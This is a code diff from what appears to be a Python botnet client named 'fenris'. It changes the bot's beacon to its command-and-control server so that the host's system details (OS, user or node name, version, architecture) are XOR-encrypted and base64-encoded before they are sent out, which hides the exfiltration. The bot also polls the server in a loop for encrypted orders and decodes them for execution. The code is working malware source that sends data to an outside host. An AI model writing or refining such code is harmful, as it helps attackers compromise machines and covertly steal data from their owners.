@@ -36,13 +36,19 @@ systemData = platform.uname()
 currentTime = time.time()
 timeFactor = 20
 
+# encrypt exfiltration data                               
+ops = base64.b64encode(''.join(chr(ord(c)^ord(k)) for c,k in izip(systemData[0], cycle(key))))
+username = base64.b64encode(''.join(chr(ord(c)^ord(k)) for c,k in izip(systemData[1], cycle(key))))
+version = base64.b64encode(''.join(chr(ord(c)^ord(k)) for c,k in izip(systemData[2], cycle(key))))
+osdetail = base64.b64encode(''.join(chr(ord(c)^ord(k)) for c,k in izip(systemData[3], cycle(key))))
+architecture = base64.b64encode(''.join(chr(ord(c)^ord(k)) for c,k in izip(systemData[4], cycle(key))))
 
 while(True):
         # get fenris orders
-        encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read()
+        encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + ops + "&username=" + username + "&version=" + version + "&osdetail=" + osdetail + "&architecture=" + architecture).read()
         orders = base64.b64decode(encryptedOrders)
         orders = ''.join(chr(ord(c)^ord(k)) for c,k in izip(orders, cycle(key)))
-        orders = orders.split("\n")
+        orders = orders.split("\n")      
         
         time.sleep(timeFactor)
     
@@ -53,8 +59,8 @@ while(True):
         if doit == "yes":
                 # let the cuteness begin
                 while(True):
-                        if (int(time.time())-int(currentTime))%timeFactor == 0:
-                                encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read()
+                        if (int(time.time())-int(currentTime))%timeFactor == 0:                                
+                                encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + ops+ "&username=" + username + "&version=" + version + "&osdetail=" + osdetail + "&architecture=" + architecture).read()
                                 orders = base64.b64decode(encryptedOrders)
                                 orders = ''.join(chr(ord(c)^ord(k)) for c,k in izip(orders, cycle(key)))
                                 orders = orders.split("\n")                                                
